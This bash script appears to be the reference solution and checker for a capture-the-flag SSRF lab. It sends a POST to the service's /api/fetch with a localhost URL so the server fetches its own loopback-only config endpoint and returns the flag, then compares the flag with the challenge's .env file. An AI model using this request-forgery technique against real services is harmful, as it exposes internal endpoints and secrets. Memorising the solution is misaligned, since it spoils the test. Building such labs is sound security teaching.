#!/usr/bin/env bash
# ============================================================
# SsrfProxy (labs15) — reference solution: unfiltered SSRF
#
# Chain: make the service fetch its own localhost-only
# internal config endpoint via POST /api/fetch — the request
# originates from the server, so the loopback IP gate opens
# itself, and the body (with the flag) is reflected back.
# No external listener involved.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8095)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8095}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] fetching the internal config through the service itself" >&2
RESP="$(curl -fsS -X POST "$BASE/api/fetch" -H 'Content-Type: application/json' \
  -d '{"url":"http://localhost:5000/internal/config"}')"

flag="$(python3 -c 'import sys,json; print(json.loads(json.load(sys.stdin)["body"])["flag"])' <<<"$RESP")"
if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag in fetched body: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
